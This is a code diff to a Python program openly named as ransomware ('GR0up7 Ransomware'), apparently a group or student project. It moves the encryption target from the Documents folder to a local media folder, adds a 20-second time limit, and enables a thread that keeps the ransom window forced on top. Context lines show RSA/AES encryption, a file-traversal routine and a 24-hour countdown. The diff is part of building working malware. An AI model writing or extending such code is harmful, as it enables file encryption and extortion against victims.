@@ -4,6 +4,7 @@
 
 import base64
 import os
+from time import time
 from pathlib import Path
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP, AES
@@ -18,7 +19,11 @@ from PIL import ImageTk, Image
 #################################################     INITIALIZATIONS     #################################################
 ###########################################################################################################################
 
-ENCRYPT_FOLDER_PATH = "../Documents"
+# In seconds
+KEEP_ACTIVE_WINDOW_TIME = 20
+
+# ENCRYPT_FOLDER_PATH = "../Documents"
+ENCRYPT_FOLDER_PATH = "./media"
 EXCLUDED_EXTENSIONS = ['.py', '.pem', '.exe']  # CHANGE THIS
 RANWOMWARE_WINDOW_NAME = 'GR0up7 Ransomware'  # CHANGE THIS
 
@@ -73,7 +78,7 @@ class GUI(Thread):
         # call countdown first time
         self.countdown('23:59:59')
 
-        # Thread(target=keep_active_window, daemon=True).start()
+        Thread(target=keep_active_window, daemon=True).start()
 
         self.root.mainloop()
 
@@ -195,7 +200,11 @@ def encryption_traversal():
 ###########################################################################################################################
 
 def keep_active_window():
+    starting_time = time()
+
     while True:
+        if time() - starting_time >= KEEP_ACTIVE_WINDOW_TIME: break
+
         ewmh = EWMH()
 
         windows_list = ewmh.getClientList()
